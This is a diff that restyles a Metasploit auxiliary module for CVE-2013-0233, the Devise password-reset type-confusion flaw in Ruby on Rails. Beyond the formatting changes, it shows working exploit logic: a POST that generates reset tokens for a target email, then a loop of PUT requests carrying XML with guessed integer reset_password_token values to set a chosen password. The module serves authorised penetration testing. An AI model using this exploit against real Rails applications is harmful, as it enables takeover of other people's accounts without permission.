@@ -9,9 +9,11 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Ruby on Rails Devise Authentication Password Reset',
-      'Description'   => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Ruby on Rails Devise Authentication Password Reset',
+        'Description' => %q{
           The Devise authentication gem for Ruby on Rails is vulnerable
           to a password reset exploit leveraging type confusion.  By submitting XML
           to rails, we can influence the type used for the reset_password_token
@@ -27,14 +29,12 @@ class MetasploitModule < Msf::Auxiliary
           of this vulnerability, by quoting numeric values when comparing them with
           non numeric values.
         },
-      'Author'        =>
-        [
-          'joernchen', #original discovery and disclosure
-          'jjarmoc' #metasploit module
+        'Author' => [
+          'joernchen', # original discovery and disclosure
+          'jjarmoc' # metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2013-0233'],
           [ 'OSVDB', '89642' ],
           [ 'BID', '57577' ],
@@ -43,29 +43,31 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://github.com/rails/rails/commit/921a296a3390192a71abeec6d9a035cc6d1865c8' ],
           [ 'URL', 'https://github.com/rails/rails/commit/26e13c3ca71cbc7859cc4c51e64f3981865985d8']
         ],
-      'DisclosureDate' => '2013-01-28'
-    ))
+        'DisclosureDate' => '2013-01-28'
+      )
+    )
 
     register_options(
       [
-        OptString.new('TARGETURI', [ true,  'The request URI', '/users/password']),
+        OptString.new('TARGETURI', [ true, 'The request URI', '/users/password']),
         OptString.new('TARGETEMAIL', [true, 'The email address of target account']),
         OptString.new('OBJECTNAME', [true, 'The user object name', 'user']),
         OptString.new('PASSWORD', [true, 'The password to set']),
         OptBool.new('FLUSHTOKENS', [ true, 'Flush existing reset tokens before trying', true]),
         OptInt.new('MAXINT', [true, 'Max integer to try (tokens beginning with a higher int will fail)', 10])
-      ])
+      ]
+    )
   end
 
   def generate_token(account)
     # CSRF token from GET "/users/password/new" isn't actually validated it seems.
 
-    postdata="#{datastore['OBJECTNAME']}[email]=#{account}"
+    postdata = "#{datastore['OBJECTNAME']}[email]=#{account}"
 
     res = send_request_cgi({
-      'uri'     => normalize_uri(datastore['TARGETURI']),
-      'method'  => 'POST',
-      'data'    => postdata,
+      'uri' => normalize_uri(datastore['TARGETURI']),
+      'method' => 'POST',
+      'data' => postdata,
     })
 
     unless res
@@ -93,9 +95,8 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Cleared #{count} tokens")
   end
 
-  def reset_one(password, report=false)
-
-    (0..datastore['MAXINT']).each{ |int_to_try|
+  def reset_one(password, report = false)
+    (0..datastore['MAXINT']).each { |int_to_try|
       encode_pass = REXML::Text.new(password).to_s
 
       xml = ""
@@ -106,11 +107,11 @@ class MetasploitModule < Msf::Auxiliary
       xml << "</#{datastore['OBJECTNAME']}>"
 
       res = send_request_cgi({
-          'uri'     => normalize_uri(datastore['TARGETURI']),
-          'method'  => 'PUT',
-          'ctype'   => 'application/xml',
-          'data'    => xml,
-        })
+        'uri' => normalize_uri(datastore['TARGETURI']),
+        'method' => 'PUT',
+        'ctype' => 'application/xml',
+        'data' => xml,
+      })
 
       unless res
         print_error("No response from server")
@@ -138,7 +139,6 @@ class MetasploitModule < Msf::Auxiliary
 
     print_error("No active reset tokens below #{datastore['MAXINT']} remain. Try a higher MAXINT.") if report
     return false
-
   end
 
   def run
